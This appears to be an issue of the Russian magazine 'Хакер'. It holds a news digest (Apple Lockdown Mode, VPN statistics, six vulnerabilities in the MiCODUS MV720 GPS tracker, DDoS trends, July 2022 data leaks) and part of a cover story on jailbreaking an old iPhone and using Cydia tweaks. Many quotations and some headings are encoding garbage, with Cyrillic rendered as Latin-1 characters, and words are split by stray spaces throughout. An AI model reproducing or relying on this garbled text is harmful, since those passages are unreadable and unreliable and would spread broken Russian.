  и защитит под ключения поль зователей, ког да они обмениваются сообщениями
  и просматривают веб-страницы.
    Попыт ки злоумыш ленников ском прометировать гад жет с помощью 0-click-
   эксплоитов (обычно они нацелены на мессен джеры или веб-браузеры) будут
   автоматически остановлены, так как все потен циаль но опасные фун кции, такие
   как пред варитель ный просмотр ссы лок, будут отключены.


        «Âêëþ÷åíèå ðåæèìà Lockdown â iOS 16, iPadOS 16 è macOS Ventura
       åùå áîëüøå óñèëèò çàùèòó óñòðîéñòâ è ñòðîãî îãðàíè÷èò îïðå äåëåííûå «
        ôóíêöèè, ðåçêî ñîê ðàùàÿ ïîâåðõíîñòü ïîòåíöèàëüíîé àòàêè, êîòîðàÿ
        ìîã ëà áû èñïîëüçîâàòüñÿ òàðãåòèðîâàííûì øïèîíñêèì ÏÎ», — ïèøóò
         â Apple.                 »
  Первая версия Lockdown Mode будет включать следующие защит ные механиз-
  мы.
   • Ñîîáùåíèÿ: блокиру ется боль шинство типов вложений (кроме изоб-
     ражений), а так же будут отключены некоторые фун кции, в том числе пред-
     варитель ный просмотр ссы лок.
   • Áðà óçèíã: отключают ся некоторые веб-технологии, такие как JIT-ком-
     пиляция  JavaScript, если поль зователь не исключит доверен ный сайт
     из блокировки.
   • Ñåðâèñû Apple: входящие приг лашения и сервисные запросы, в том чис-
     ле вызовы FaceTime, блокиру ются, если поль зователь ранее не отправлял их
     инициатору вызов или запрос.
   • Ïðîâîäíûå ñîåäè íåíèÿ с компь ютером и аксессу арами блокиру ются,
     если iPhone заблокирован.
   • Ïðîôèëè êîí ôèãóðà öèè (могут исполь зовать ся для заг рузки сторон них
     приложений в обход App Store) не могут быть установлены и устройство
     не может зарегистрировать ся в MDM, пока активен режим Lockdown.

         «Òàê æå, ÷òîáû ñòèìóëèðîâàòü ôèäáýê è ñîòðóäíè÷åñòâî ñî ñòîðîíû
        ñîîáùåñòâà  ÈÁ‑èññëå äîâàòåëåé,  Apple  ó÷ðå äèëà  íîâóþ  êàòåãîðèþ «
         â ðàìêàõ ïðîã ðàììû Apple Security Bounty, ÷òîáû âîçíàãðàæäàòü èññëå-
         äîâàòåëåé,  êîòîðûå  îáíàðóæàò  ñïîñîáû  îáõîäà  Lockdown  Mode
        è ïîìîãóò óëó÷øèòü åãî çàùèòó, — äîáàâèëè â êîìïàíèè. — Íàã ðàäû
         çà ñîîòâåòñòâóþùèå êðèòåðèÿì ïðîáëåìû â ðåæèìå Lockdown óäâà-
        èâàþòñÿ, ìàê ñèìóì ñîñòàâèò 2 000 000 äîëëàðîâ ÑØÀ — ýòî ñàìàÿ
         âûñîêàÿ ìàê ñèìàëüíàÿ âûï ëàòà â îòðàñëè».                 »
  Эк сперт Citizen Lab Джон Скотт-Рейлтон (John Scott-Railton), который кон суль-
   тировал жертв спайвари NSO Group и изу чал ее, пишет, что режим Lockdown —
  один из первых достаточно эффективных методов защиты для уязвимых поль-
   зователей, которым они смогут следовать, не вык лючая устройства полностью.


         «Ó ðàçðàáîò÷èêîâ êðóï íûõ ïëàòôîðì è ÎÑ åñòü íåêèé ïñèõîëîãè÷åñêèé
         áàðüåð, ñâÿ çàííûé ñ âíåäðåíèåì ôóíêöèé äëÿ ïîâûøå íèÿ  óðîâíÿ «
         áåçîïàñíîñòè. Ìíîæåñòâî  íåèçáåæíûõ  ñîìíåíèé  ñâÿ çàíû  ñ  [âîç-
        ìîæíûì] óõóäøåíèåì user experience (îñîáåííî ïî ñðàâíåíèþ ñ êîí-
         êóðåíòàìè!), íåðàáîòàþùèìè ôóíêöèÿìè, ñ òåì, ÷òî ïîíàäîáèòñÿ áîëü-
       øå  ðåñóðñîâ  äëÿ  ïîääåðæêè  êëèåíòîâ, è  òàê  äàëåå, —  ãîâîðèò
         Ñêîòò‑Ðåéëòîí. — Êðóï íûå êîìïàíèè ìîãóò ìåäëåííî âíåäðÿòü ôóíêöèè
        ïîâûøåííîé áåçîïàñíîñòè. Îäíàêî, êîã äà îíè „îêóíàþòñÿ“ âî âñå ýòî,
         ÷àñòî ïðèõîäèò ïîíèìàíèå òîãî, ÷òî íåêîòîðûå èç ýòèõ ôóíêöèé ìîæíî
         ðåàëèçîâàòü äëÿ âñåé èõ ïîëüçîâàòåëüñêîé áàçû».                 »

  ВТОРЫЕ ПОСЛЕ ИНДИИ
  В июле 2022 года Рос сия заняла вто рое мес то в мире по количес тву заг рузок VPN, уступив
   лишь Индии, гласит статис тика сер виса AppMagic. Год назад, в июле 2021 года, Рос сия
   занимала лишь 15-е мес то в этом спис ке.

   За пер вые три недели июля VPN в Рос сии скачали более 12 миллионов раз. Для срав нения:
   в январе 2022 года VPN-сер висы в Рос сии заг рузили толь ко 2 миллиона раз.

  По данным сер виса Google Trends, боль ше все го поль зовате лей, которые искали VPN в Google
   за пос леднее вре мя, были из Мос квы и Мос ковской области , Санкт‑Петер бурга, Ка-
  линин градской и Ярос лавской областей.

  По оценке Google, наибо лее популяр ными стали запросы, свя занные с  1.1.1.1, Lantern,
   Psiphon и Super VPN.





 УЯЗВИМОСТИ GPS-
 ТРЕКЕРА ОПАСНЫ
 ДЛЯ АВТО
  Серь езные проблемы с безопасностью были найдены в GPS-трекере, который
  исполь зует ся примерно в 1,5 миллиона автомобилей в 169 странах мира. Речь
  идет об устройстве MiCODUS MV720, которое содержит сразу шесть уяз-
  вимостей.
     Тран спортные  средства,  которые  оснащают ся  этими GPS-трекерами,
  исполь зуют многие ком пании из списка Fortune 50, а так же правитель ства,
  воен ные, правоохранитель ные органы, аэрокосмические, судоход ные и про-
  изводствен ные ком пании.
     Эк сперты из ком пании BitSight сообщили, что хакер, взломавший уязвимый
  MV720, сможет исполь зовать трекер для отслеживания тран спортного средс-
   тва, сможет обездвижить его или попросту будет собирать информацию о мар-
  шру тах и манипу лировать дан ными. По словам исследователей, такие взломы
   могут иметь серь езные последствия для националь ной безопасности целых
   стран.
     Эк сперты изу чили кон крет ную модель MiCODUS, потому что это недорогое
   (около 20 долларов США) и очень популярное устройство, обладающее фун-
  кциями отслеживания с под держкой сотовой связи, а так же оно может исполь-
   зовать ся для потен циаль но опасных действий, в том числе отключение подачи
   топлива.
    Пока не все обнаружен ные BitSight уязвимости получили иден тификаторы
  CVE, но они описываются следующим образом.
   • CVE-2022-2107 (9,8 балла по шкале CVSS): жестко закодирован ный мас-
     тер-пароль на API-сервере позволяет удален ному и неаутен тифицирован-
     ному злоумыш леннику захватить кон троль над любым трекером MV720,
     прек ратить подачу топлива, отслеживать поль зователей и отключать сиг-
     нализацию.
   • CVE-2022-2141 (9,8 балла по шкале CVSS): неработающая схема аутен-
     тификации позволяет любому отправлять коман ды GPS-трекеру через SMS
     и выполнять их с правами администратора.
   • CVE íå ïðèñâîåí (8,1 балла по шкале CVSS): слабый пароль по умол-
     чанию (123456) на всех трекерах MV720, и от поль зователя не требуют
     изменить его после началь ной настройки устройства.
   • CVE-2022-2199 (7,5 балла по шкале CVSS): XSS-уязвимость на главном
     веб-сервере  позволяет  злоумыш леннику  получить  доступ  к  учет ным
     записям поль зователей, взаимодействовать с приложениями и просматри-
      вать всю информацию, доступную кон крет ному поль зователю.
   • CVE-2022-34150 (7,1 балла по шкале CVSS): небезопасная прямая
     ссылка на объект на главном веб-сервере позволяет вошед шему в систему
     поль зователю получить доступ к дан ным любого ID в БД сервера.
   • CVE-2022-33944 (6,5 балла по шкале CVSS): небезопасная прямая
     ссылка на объект на главном веб-сервере позволяет неавторизован ным
     поль зователям создавать отчеты в формате Excel об активности GPS-тре-
      кера.

  Ин тересно, что исследователи наш ли описан ные уязвимости еще 9 сен-
   тября 2021 года, после чего попытались немед ленно связать ся с инженерами
  MiCODUS, но это оказалось не так просто. Неод нократ ные попыт ки выйти
  на кон такт с ком панией и найти человека, который мог бы принять отчет
  об уязвимостях, так и не увен чались успехом. В итоге 14 января 2022 года
  пред ставители  BitSight  поделились  всеми  техническими  под робностями
  об уязвимостях с пред ставителями Министерства внут ренней безопасности
  США и попросили их связать ся с поставщиком самостоятель но.
     К сожалению, в настоящее время GPS-трекеры MiCODUS MV720 по-преж-
  нему уязвимы для перечисленных проблем, так как производитель до сих пор
  не выпустил пат чи.

           «BitSight ðåêîìåíäóåò ÷àñòíûì ëèöàì è îðãàíèçàöèÿì, êîòîðûå â íàñ-
        òîÿùåå âðå ìÿ èñïîëüçóþò GPS-òðå êåðû MiCODUS MV720, îòêëþ÷èòü ýòè «
         óñòðîéñòâà äî òåõ ïîð, ïîêà íå áóäóò äîñòóïíû èñïðàâëåíèÿ, — ïèøóò
         èññëå äîâàòåëè. —  Îðãàíèçàöèè,  èñïîëüçóþùèå ëþáîé  GPS-òðå êåð
        MiCODUS, íåçàâèñèìî îò ìîäåëè, äîëæíû áûòü îñâå äîìëåíû î íåáåçî-
         ïàñíîñòè àðõèòåê òóðû åãî ñèñòåì, êîòîðàÿ ìîæåò ïîñòàâèòü ïîä óãðîçó
        ëþáîå óñòðîéñòâî».                 »

 ПРОДОЛЖИТЕЛЬНОСТЬ DDOS РАСТЕТ

   Спе циалис ты «Лаборатории Кас пер ско го» и Qrator Labs опубликовали отче ты о DDoS-атаках
   во вто ром квар тале 2022 года: общее количес тво атак пос тепенно снижает ся, однако рас тет
   их длитель ность: максималь ная про дол житель ность одно го инцидента сос тавила почти
  29 дней.

  В прошлом квар тале медианное вре мя атаки прибавило более 50% по срав нению с чет вертым
   квар талом 2021 года, а во вто ром квар тале текуще го года оно уве личилось сразу на 60 с ,
   и теперь медианное вре мя атаки сос тавля ет 6,5 мин .





   Воз росла и сред няя про дол житель ность DDoS-атак: в апре ле она сос тавила 40 ч, в мае — 57,
   и лишь в июне этот показатель пошел на спад. Самая дол гая DDoS-атака началась в мае и про-
   дол жалась почти 29 дней.

  В векторах атак традиционно тройку лидеров удер живают UPD flood (40,84% всех атак), SYN
   flood (28,40%) и IP flood (8,47%).





  В ско рос тях атак про изошли сов сем нез начитель ные изме нения. К примеру, количес тво DDoS-
   атак полосой до 10 Гбит/с умень шилось на 4,98% , сос тавив 81,53% всех атак.

   Глав ной целью DDoS-атак «Лаборатория Кас пер ско го» называет финансовый сектор. Доля
   атак на финансовые организации варь иро валась от 70% в апре ле до 37% в июне. В начале
   лета сре ди компаний-мишеней рез ко вырос ла доля государс твенных организаций: в июне
   на них пришлось 38% всех DDoS-атак в Рос сии.





 УТЕЧКИ МЕСЯЦА
  В июле 2022 года произош ло немало утечек дан ных. Перечислим наиболее
  замет ные из них, особен но те, которые зат ронули российских поль зователей.


   Twitter
  В даркнете выставили на продажу дан ные 5,4 миллиона (5 485 636) поль-
   зователей Twitter. База появилась в резуль тате ком бинирования откры тых дан-
  ных с телефон ными номерами поль зователей и их адресами элек трон ной поч-
   ты, которые стали известны через эксплу атацию бага. Злоумыш ленник оценил
   базу в 30 тысяч долларов США.
     Злоумыш ленник, продающий дамп, под твердил СМИ, что сбором дан ных
  он занимался в декабре 2021 года и исполь зовал для этого уязвимость. Этот
   баг был исправлен в начале января текущего года, и сообщение о нем дей-
   ствитель но можно найти на HackerOne.
    Описание  бага   гласит,   что  он  позволяет  любому  желающему
  без какой-либо аутен тификации узнать  Twitter ID (что почти равносиль но
   получению имени поль зователя учет ной записи) любого поль зователя социаль-
  ной сети через номер телефона или адрес элек трон ной почты, даже если поль-
   зователь запретил это в настройках кон фиден циаль ности.


  «Òóòó.ðó»
  В начале июля специалисты Data Leakage & Breach Intelligence (DLBI) обнаружи-
   ли, что в сети появилась часть базы дан ных сервиса покупки билетов «Туту.ру»
   (tutu.ru). В ком пании под твердили факт взлома и уже занимаются расследова-
  нием инциден та.
     За слив базы ответственен тот же источник, который недавно распростра-
  нял дам пы «Школы управления Сколково», службы доставки Delivery Club
  и образователь ного портала GeekBrains.
     Су дя по названию файла (TutuBusorders), который опубликовал хакер, в нем
  содержатся дан ные покупателей билетов на автобус — 2 627 166 строк, вклю-
   чая имена и фамилии, телефоны (2,29 миллиона уникаль ных номеров) и адре-
  са элек трон ной почты (более 2 миллионов уникаль ных адресов).
     Хакер заявил, что, помимо этого списка, ему так же удалось получить дам пы
   таблиц зарегистрирован ных поль зователей (7 миллионов строк с хеширован-
  ными паролями) и заказов билетов (32 миллиона строк с паспортны ми дан-
   ными). Однако никаких доказатель ств своих слов он не предоставил.
     Пред ставители «Туту.ру» под твердили факт взлома. По их дан ным, в три
   часа ночи 1 июля 2022 года был сформирован файл с дан ными сделан ных
  через сайт tutu.ru покупок автобусных билетов. В общей сложности — 2,5 мил-
  лиона строк технических неочищен ных дан ных (в том числе с повторами).
  В дамп вош ли номера заказов, имена пассажиров и email-адреса. Под черки-
   вает ся, что платежных дан ных и дан ных о маршру тах файл не содержал.


  ÑÄÝÊ
  Специалисты уже упомяну той выше ком пании DLBI заметили опубликован ную
   в свобод ном доступе базу с дан ными поль зователей тран спортной ком пании
  СДЭК. По информации исследователей, новый дамп состоит из трех файлов:
   • client.csv:   161,7   миллиона    строк,   содержащих   информацию
     о 329 382 отправлениях (ФИО получателя, email-адрес получателя, наз-
     вание ком пании-отправителя, иден тификатор отправителя/получателя, код
     пун кта самовы воза);
   • contragent.csv: 30 129 288 строк с информацией о физических и юридичес-
      ких лицах (ФИО или название ком пании на русском и английском язы ках,
     телефон, email-адрес, дата создания/обновления записи). Судя по датам
     из этого файла, дамп базы был сделан 05.07.2022;
   • phone.csv: 92 610 884 строки с телефонами, иден тификаторами отправите-
      ля/получателя (через эти иден тификаторы есть связь с дан ными из файла
       client.csv). Без дублей дамп содержит 24,7 миллиона телефонов.

  PR-дирек тор СДЭК Анна Иоспа сообщила СМИ, что сейчас ком пания проводит
   внут реннее расследование и выясняет обстоятель ства возможной утечки дан-
   ных. От каких-либо дополнитель ных ком ментариев в СДЭК отказались.


  CRM Ozon
  Эту утечку так же заметили аналитики DLBI: на имид жборде 2ch были опуб-
  ликованы скрин шоты CRM-системы маркет плейса Ozon.
     Всего в общий доступ попали двенад цать скрин шотов, содержащих фраг-
  менты переписки службы под держки (одного и того же специалиста, от чьего
  имени был выполнен вход в CRM-систему) с клиентами. Судя по датам,
  которые попали «в кадр», скрин шоты делались почти на протяжении месяца
   (с 1 по 25 июля 2022 года).
     Эк сперты пред положили, что публикация может оказать ся связана со «сла-
  боумием и отвагой» сот рудника службы под держки «Озон» или же у кого-то
  из сот рудников похитили учет ные дан ные.
     Вскоре пред ставители Ozon дали официаль ный ком ментарий СМИ. Как и
  пред полагали исследователи, прош трафился один из сот рудников под держки.

         «Èç‑çà íåäîáðîñîâåñòíûõ äåéñòâèé îäíîãî ñîòðóäíèêà ïîääåðæêè êëè-
         åíòîâ  äàííûå  íåñêîëüêèõ  çàêàçîâ  ïîïàëè  â  ñåòü. Â  ñêðèíøîòàõ «
         íå ñîäåðæèòñÿ ïëàòåæíûõ äàííûõ ïîêóïàòåëåé, à ñàìè ñêðèíøîòû íåèí-
         äåêñèðóåìûå, ÷òî çíà÷èòåëüíî îãðàíè÷èâàåò âîçìîæíîñòü ðàñïðîñòðà-
         íèòü èíôîðìàöèþ», — ðàññêàçàëè â ïðåññ‑ñëóæáå «Îçîíà».                 »
   Так же в ком пании заявили, что этому сот руднику момен таль но заблокировали
  доступ в корпоративные системы, он будет уволен, а в настоящее время при-
  нимается решение о передаче информации в правоохранитель ные органы
  для возбуждения уголовного дела.


  «Ïî÷òà Ðîññèè»
  В даркнете опубликовали «пробник» на 10 миллионов строк, содержащий
  информацию из базы дан ных отправлений «Почты России». Пред ставители
  «Почты России» под твердили утечку и заявили, что неназванный под рядчик
  был ском прометирован в резуль тате хакерской атаки.
    По информации исследователей, опубликован ный на хак-форуме «проб-
   ник» содержит 10 миллионов строк, в числе которых:
   • номер отслеживания (трек-номер отправления);
   • ФИО (или название ком пании) отправителя/получателя;
   • телефон получателя;
   • город/индекс отправителя/получателя;
   • масса/статус отправления;
   • дата/время отправления.

  Вы борочная проверка по трек-номерам через сайт pochta.ru показала, что
  информация в дам пе под линная, а по фраг менту базы можно пред положить,
   что дан ные акту аль ны на 11 июня 2022 года.
     При этом хакер утверждает, что, кроме упомяну того списка, ему удалось
   получить дамп таблицы с дан ными всех клиентов «Почты России».
    Официаль ные пред ставители ком пании уже под твердили, что утечка дей-
   ствитель но имела место, однако они утверждают, что все похищен ные дан ные
   хакер уже опубликовал.


        «Îäíà èç ó÷åòíûõ çàïèñåé íàøåãî ïîäðÿä÷èêà áûëà ñêîìïðîìåòèðîâàíà
         â ðåçóëüòàòå õàêåðñêîé àòàêè, ôðàã ìåíò äàííûõ äåéñòâèòåëüíî ïîïàë «
         â  ðóêè âçëîìùèêîâ. Ðîâíî  ýòîò ôðàã ìåíò äàííûõ ñåé÷àñ âûäàþò
         çà „ïðîáíûé“.
          Íà ñàìîì äåëå äîñòóïà ê äðóãèì çàïèñÿì ó âçëîìùèêîâ íåò. Óòå÷êà
         íå ñîäåðæàëà áàíêîâñêèõ äàííûõ, áåçîïàñíîñòè è ðåïóòàöèè êëèåíòîâ
         íè÷åãî íå óãðîæàåò. Ñëóæáà áåçîïàñíîñòè çàáëîêèðîâàëà äîñòóï ÷åðåç
        ñêîìïðîìåòèðîâàííûé àêêàóíò è ïåðåï ðîâåðèëà óðîâåíü áåçîïàñíîñòè
        ïî âñåì âîçìîæíûì òî÷êàì äîñòóïà», — ãëàñèò ñîîáùåíèå â îôèöèàëü-
        íîì Telegram-êàíàëå «Ïî÷òû Ðîññèè».                 »

  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Сот рудник HackerOne шантажиро вал клиентов плат формы


  В Рос сии заблокиро вали почтовый сер вис Swisscows


  Майнинговая кампания CuteBoi зат ронула более 1200 пакетов NPM


   Уяз вимость поз воля ет удаленно раз бло киро вать и завес ти авто мобили Honda


  Фишеры похитили более 8 мил лионов дол ларов у поль зовате лей Uniswap


  Мал варь  Sality атакует про мышленные сис темы через инс трументы для вос станов ления
   паролей


   Данные с изо лиро ванных машин можно похитить с помощью SATA-кабелей


   Из-за рос та цен на бензин в США учас тились взло мы на АЗС


   Windows 11 будет бло киро вать RDP-брут форс по умол чанию


   Яндекс пре дупредил, что мошенники прикидывают ся Алисой
COVERSTORY





  УКРАШАЕМ IOS С ДЖЕЙЛБРЕЙКОМ ПРИ
  ПОМОЩИ НЕОФИЦИАЛЬНЫХ ТВИКОВ




Если  обсто ятельства  вынуждают  тебя
использовать ста рый iPhone, на который
уже невоз можно уста новить сов ремен ные
при ложения, единствен ный выход — джей-
лбрейк. Эта нехит рая про цеду ра поз воля-         Ася Холмогорова                                                                               Девушка - загадка...
ет не только поставить на смар тфон прак-          n5hal1na@yandex.ru
тически любой софт, даже не авто ризо-
ван ный Apple, но и изменить мно жество
скры тых настро ек iOS для более удобной
работы. Какие еще воз можности откро ет
перед тобой джейл? Сей час раз берем ся!


Что может быть хуже разбитого айфона? Толь ко разбитый айфон, который заб-
рали в мастерскую на несколь ко дней из-за того, что нет нужных запчастей.
Приш лось достать из пыль ного чулана старень кий iPhone 6 с iOS 12.5.5,
который я ког да-то носила в школу, чтобы поиг рать им в фут бол на переменах.
Несмотря на непрезен табель ный внеш ний вид, аппарат, слава Джобсу, пока
еще работает. Из чистого любопытства я решила под вергнуть его джейлбрей-
ку, подумав, что после всех пережитых издеватель ств, включая слу чайное
купание в унитазе, хуже этому айфону уже точно не станет. Получилось
и вправду интересно!


ÄÆÅÉËÁÐÅÉÊ
Джейл фак тически снимает установленные Apple ограничения для iOS, откры-
вая приложениям доступ к файловой системе телефона и позволяя юзеру
менять настройки, которые в обычном состоянии ему недоступны. «Хакер» уже
писал о различных методах джейлбрейка, в том числе для iOS 12. Я поп-
робовала их все. Если ты решишь пойти по моим стопам, сэконом лю тебе
нем ного времени: Cydia Impactor по непонят ным причинам не работает, поэто-
му в качестве установщика образа .ipa можно исполь зовать  Sideloadly
и AltServer . Что, впрочем, тоже совершенно бесполезно, посколь ку unc0ver
после запуска вылетает с ошибкой пат чинга ядра, а Chimera стабиль но выдает
ошибку вообще без каких-либо объяснений. Зато Сheckra1n , в отличие от аль-
тернативных методов, прек расно работает.





                       Сheckra1n работает, ура!

Основная задача джейлбрейка — установить на iPhone приложение под наз-
ванием Cydia. Cydia — это менед жер .deb-пакетов: посколь ку iOS — раз-
новид ность Unix, в операционке исполь зует ся система управления пакетами
dpkg из Debian, а Cydia является графической надстройкой над ней. Дру гими
словами, Cydia — это аналог App Store, позволяющий установить приложения,
темы и расширения для системы, которых нет и никог да не будет в официаль-
ном магазине Apple. К слову, само название прог раммы намекает на портящее
яблони насекомое — яблонную плодожорку (лат. Cydia pomonella). И в отличие
от официаль ного App Store, Cydia позволяет добавлять в настройки приложе-
ния дополнитель ные внеш ние хранилища софта — репозитории. От слова
«репа» (лат. Brassica rapa). Про репу — шучу, конечно.
  После установки Cydia ты не теряешь возможности поль зовать ся обычным
App Store, но теряешь гаран тию производителя (впрочем, для старых телефо-
нов она и так неак туаль на). Из Cydia можно заг рузить, во-первых, разные при-
ложения (включая старые версии софта, уже недоступные в официаль ном
каталоге), а во-вторых — твики, меняющие внеш ний вид iOS и откры вающие
доступ к разнообразным настройкам системы. Вот о них мы сегод ня и погово-
рим.
   Боль шинство прог рамм и твиков в Cydia бесплат ны, но есть и плат ные
варианты. Однако ж, вот незадача, подавляющее боль шинство разработ чиков
пред почитает в качестве платежной системы PayPal, а с этой платежкой в Рос-
сии сейчас… эм-м-м… некоторые траблы. Короче, мы не гордые, обойдем ся
и бесплат ным сыром.
  Важный момент: при попыт ке обновить ОС на взломан ном айфоне ты
можешь столкнуть ся с удалением Cydia и всех установленных твиков и при-
ложений. Поэтому обязатель но отключи апдейты, чтобы не поломать свое
пират ское королевство. Для этого зайди в «Настройки → Основные →
Обновление ПО → Автообновление» и перед винь влево перек лючатель «Заг-
рузка обновлений iOS». Так что устанавливать апдейты на телефон с джей-
лбрейком, в общем-то, можно, просто на выходе ты получишь чистень кий
и акку рат нень кий телефон без джейлбрейка.
   Так же не забывай, что Сheckra1n — это полуот вязан ный джейлбрейк ,
который слетит, ког да питание айфона отключит ся. Поэтому после телефон
лучше не перезаг ружать и не высаживать акку мулятор в ноль — иначе джейл
придет ся повторить. Тог да все установленные приложения и твики чудесным
образом вернутся на свое место, ставить весь «пират ский» софт еще раз
по новой не придет ся.




                    Не стоит ста вить на джей лбрей кну тый телефон
                      банковские, брокерские и прочие финансовые
                      при ложения, а также втыкать симку, к которой
                      при вяза ны важ ные акка унты. В противном слу чае
                     ты очень рис куешь. При ложения и тви ки из Cydia
                       созданы сторонними разработ чиками и не про-
                      ходи ли проверку от Apple, поэтому какие данные
                      о тебе они могут соб рать и куда передать —
                       большой вопрос. Еще для джей лну того айфона
                        луч ше создать новый Apple ID — по той же самой
                      при чине.



ÊÀÊ ÏÎËÜÇÎÂÀÒÜÑß CYDIA?
Со слезами на глазах! Примерно 70% твиков из Cydia в итоге чаще всего ока-
зываются нерабочими. Некоторые идут толь ко на iOS версии 9, 10, 11, 14 (в
общем, на любой, кроме твоей), дру гие просто не устанавливаются и выдают
ошибку, а третьи устанавливаются, но не работают. В этой статье я разобрала
десяток проверен ных мной твиков, которые гаран тирован но пашут на iPhone
6 с iOS 12.5.5.
   Внут реннее устройство Cydia слег ка напоминает App Store, но с непривыч-
ки там можно заблудить ся.





                                  Cydia

Если ты пока еще не знаешь, что хочешь скачать, восполь зуйся списком Find
Extensions for Applications, который находит ся в главном разделе Cydia. Там ты
сможешь найти огромное количество твиков и приложений, рассортирован ных
по разным темам, и выбрать то, что придет ся тебе по душе.
  После установки все твики будут отображать ся списком в стан дартном окне
«Настройки» iOS. Чтобы добрать ся до него, придет ся промотать экран вниз
до кон ца. Если ты хочешь изменить настройки твика или покопать ся в них, нуж-
но тапнуть по его названию в этом списке. Некоторые твики сразу после уста-
новки не работают — их надо пред варитель но включить, перед винув соот ветс-
тву ющий перек лючатель в окне настроек.





                Вот он, список всех установленных твиков

Итак, давай посмотрим на десять самых приколь ных твиков, которые тебе обя-
затель но следует попробовать, если ты решился сделать на своем айфоне
джейлбрейк.


RECORDPAUSE
В приложении «Камера» на айфоне в режиме съем ки видео есть всего две
фун кции: начать и закон чить запись ролика. А где пауза? А нет паузы! Любите-
ли поснимать на айфон, наверное, не раз сталкивались с тем, что между инте-
ресу ющими оператора событиями проходил слиш ком боль шой промежу ток
времени: приходит ся либо снимать один боль шой ролик, либо делать два
малень ких и мон тировать из них один. В общем, Стивен Спилберг не одоб-
ряет.
  Создатели RecordPause решили эту проблему, добавив в «Камеру» воз-
можность поставить видео на паузу во время съем ки. Сделать это можно дол-
гим касанием кнопки, включающей запись. Чтобы продолжить съем ку, нужно
нажать кнопку еще раз. Удобно!


COLORMYBATTERY
«Здрась те, батарейку пок рась те», — сказал разработ чик @imkpatil и придумал
твик ColorMyBattery. На старых айфонах индикатор батарейки пред ставлен дву-
мя способами: в виде стан дартного значка или в виде индикатора с процен-
тами заряд ки. В современ ных версиях iOS фун кцию отображения процен тов
убрали, чтобы в очеред ной раз не лишать поль зователей Apple нервных клеток,
коих у них осталось не так уж и много. Твик под названием ColorMyBattery
не толь ко решает эту проблему и позволяет вернуть себе украден ные ребята-
ми из Apple процен тики, но и дает возможность настроить цвет индикатора
батареи в зависимости от уровня ее заряда.





                              ColorMyBattery

Разработ чики твика разделили уровень заряда акку мулятора на десять стадий
по 10% от 0 (батарея полностью разряжена, ищи розет ку) до 100. Каждому
из этих диапазонов можно назначить свой цвет. Теперь достаточно одного бег-
лого взгляда на экран, чтобы понять, сколь ко твоему айфону осталось жить
на этом уровне заряда.


CARRIERIZER
Если вдруг ты стесняешь ся, что твой айфон под ключен к какому-нибудь опе-
ратору «Грам мофон», обязатель но установи твик Carrierizer. Он позволяет:
 • задать произволь ное название оператора связи;
 • изменить текст, который отображается при отсутствии сим-карты;
 • полностью скрыть название оператора;
 • вы вести фейковое сообщение о том, что ты находишь ся вне зоны действия
   сети;
 • вы вести фейковое сообщение о том, что в телефоне установлены две
   сим-карты;
 • показать твой IP-адрес вместо названия оператора.





                                      Carrierizer




                     При  включении   некоторых  функций   тви ка
                       HomeGesture,  уби рающих  отоб ражение имени
                       оператора свя зи, Carrierizer работать не будет.
                       Чтобы твик работал, не перед вигай  пол зунок
                        iPhone X  Style  Status  Bar  в менюш ке  тви ка
                      HomeGesture из выключенного положения.



HIDEYOURAPPS
Теперь можно скрыть «Тин дер» на телефоне, если ты опасаешь ся, что его уви-
дит твоя девуш ка. Восполь зовавшись твиком HideYourApps, ты заставишь
исчезнуть с рабочего стола значок любого установленного приложения. Список
приложений находит ся в меню настроек твика и откры вает ся, если нажать над-
пись Select apps to hide.





                              HideYourApps

Перед винув  перек лючатель  вправо,  ты  прячешь  любое  установленное
на телефоне приложение (прог раммы, установленные из Cydia, сюда так же
входят). Чтобы вернуть его на место, снова зайди в настройки HideYourApps
и перек лючи ползунок в обратное положение. Единствен ный способ продол-
жать  поль зовать ся скры тым приложением —  это привязать  его  запуск
к какому-либо действию при помощи твика Activator (о нем поговорим чуть
позже).


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY




              УКРАШАЕМ IOS С ДЖЕЙЛБРЕЙКОМ ПРИ
            ПОМОЩИ НЕОФИЦИАЛЬНЫХ ТВИКОВ





DELETEFOREVER
При удалении фото и видео с айфона эти файлы складываются в папку «Недав-
но удален ные», отку да их можно либо восстановить (вдруг ты переду мал?),
либо удалить уже окон чатель но и навсегда. Но что делать, ког да на экране
высветилось уведом ление, что память закон чилась, а тебе надоело удалять
фот ки в два этапа, чтобы освободить ее? Твик DeleteForever дает возможность
избавить ся от всех изображений и видео одним нажатием.





                                 DeleteForever

После его установки в дополнение к стан дартной фун кции «Удалить фото»,
которую вызывают нажатием на изображение мусорной корзины в кон текстном
меню, появляет ся кнопка «Permanently Удалить фото». Она позволяет мгновен-
но избавить ся от всего ком прометирующего тебя фото- и видеоматериала
без резервного копирования на iCloud или помещения его во времен ную пап-
ку. Теперь под руга точно не найдет твои дик пики, пусть даже не пытается!


HOMEGESTURE
Все вок руг ходят с современ ными айфон чиками, а ты слил все сбережения
в крипту, поэтому у тебя не осталось денег на что-то дороже «шестерки»?
С HomeGesture это боль ше не проблема. Один из лучших джейлбрейк-твиков
iOS 12 позволяет перенести привычные элемен ты визу аль ного оформления
и жесты iPhone X на старые устройства.
  В «классических» айфонах все запущен ные приложения вызывают двойным
нажатием кнопки Home, в отличие от современ ных, где то же самое делается
свайпом вверх от нижней части экрана. Твик добавляет эту фун кцию в iOS 12.
Теперь открыть список запущен ных прог рамм можно, слег ка смахнув вверх.
Очень удобно, если кнопка Home на твоем древнем айфоне работает через
раз или ее украли тик-токеры она вовсе сломалась.
   Так же в HomeGesture присутству ет несколь ко настроек для цен тра управле-
ния. Сам центр после установки твика переместится наверх, а еще на телефо-
не появит ся возможность добавить отображение верхней панели со значками
батареи, количества оставшегося заряда, под ключен ного вайфая и дру гими.
При желании в настройках твика центр управления можно сдвинуть вверх-вниз
в вертикаль ной ориентации смартфона и влево-вправо в горизон таль ной.





                            HomeGesture

Еще одна интересная фича — возможность сменить ком бинацию кнопок
для создания сним ков экрана и выбрать, какие уголочки (круг лые или квад-
ратные) будут отображать ся в левом нижнем углу дисплея при создании скри-
нов. Например, с исполь зованием твика можно делать скрин шоты ком бинаци-
ей кнопок вык лючения и прибавки гром кости, как на более новых моделях
айфона, у которых кнопки Home нет вовсе.
   Кстати, HomeGesture добавляет в нижнюю часть экрана полоску, за которую
можно «схватить» приложение при свайпе вверх — как на iPhone X и более
старших моделях. Среди фун кций есть даже выбор цвета этой полоски. Что
касается экрана блокировки, здесь разработ чики твика предусмотрели воз-
